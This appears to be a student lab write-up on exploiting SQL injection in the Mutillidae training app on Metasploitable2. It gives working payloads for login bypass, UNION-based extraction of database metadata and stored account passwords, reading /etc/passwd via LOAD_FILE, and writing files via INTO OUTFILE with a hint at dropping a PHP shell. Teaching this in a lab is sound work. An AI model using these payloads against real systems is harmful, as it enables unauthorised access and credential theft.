# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database.


Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/6982d9a0-a781-44ce-af29-26dbde20403e)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/4259c9bf-1d8e-48ff-926f-88345c5e98f4)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/a62f6407-224d-493d-b981-a2d1dad7ed39)

Click on the menu Login/Register and register for an account
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/45352bbd-0c8b-4db1-a8dd-9f1f9f0de78c)

Click on the link “Please register here”
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/7cec22ca-e53d-4015-a42e-bafde0ff29e5)
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/d66e3680-6a0f-4aaf-8298-b985c59569d2)

Click on “Create Account” to display the following page:
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/f3909cec-9a6c-4732-94dc-c66af1c5f618)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
 ![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/0ea3e8ec-a3af-44ed-9537-dd0ad8496080)

 Click “Login”. The logged in page will show as below:
 ![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/78d31bae-9c50-4a56-8195-6a8ecbb2dbf0)

 ## Bypassing login field
 The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/97d81a87-365d-4077-ae83-27126a94c86a)

Click the login button and you will see it enter into the administrator page.
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/3db8dbd7-0611-4c1c-bc2c-7eeb7718494d)

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/6e32d6f9-f39f-48a4-b44b-aecb2741ee22)
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/df11cb8c-d072-41ca-ae5f-425de8ed0b8e)
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/820bcce2-b310-47a4-bc43-79db8c31aa37)
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/3d0e3bd8-16ec-46a5-80ea-6a178925691d)
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/1d3ed2fe-e274-4336-9080-684d661e48d1)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/13193916-4e7b-401a-aa82-20c7464d84ec)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/83543d64-bdf9-4a98-b80a-62dc4719b3e7)

After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/2e3a70a0-7b2a-48c6-9514-e8012d0c12c6)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/36f930ad-1e06-4c2c-9f4e-194b3db334f4)

 As it is having 5 columns the query worked fine and it provides the correct result
 ![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/e4ebaec7-82a3-45b5-9b92-3aac3115c331)

 Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).
 ![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/276ea21e-2539-4de7-b202-f50fa9c73042)

 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
 ![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/ed5878ba-96ab-4ab1-91ce-38ba8f1a2043)

 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/0eb145ed-0a75-4d46-8c51-48d5708191e1)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/46bd8952-514e-4db6-99b3-44b60d69495a)

The url once executed will  retrieve table names from the “owasp 10” database.

## Extracting sensitive data such as passwords
When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/0f3a4e2f-8b06-42e5-a79d-6fca1f627112)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/43499f8b-61e3-429e-aec0-fbac321da4d6)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/41ba5431-966f-497c-8e67-581fa02c4b5b)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/AmirthaRoopaS/sqlinjection/assets/143496311/6c3766e9-9dce-47b5-8063-d521c584bd95)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
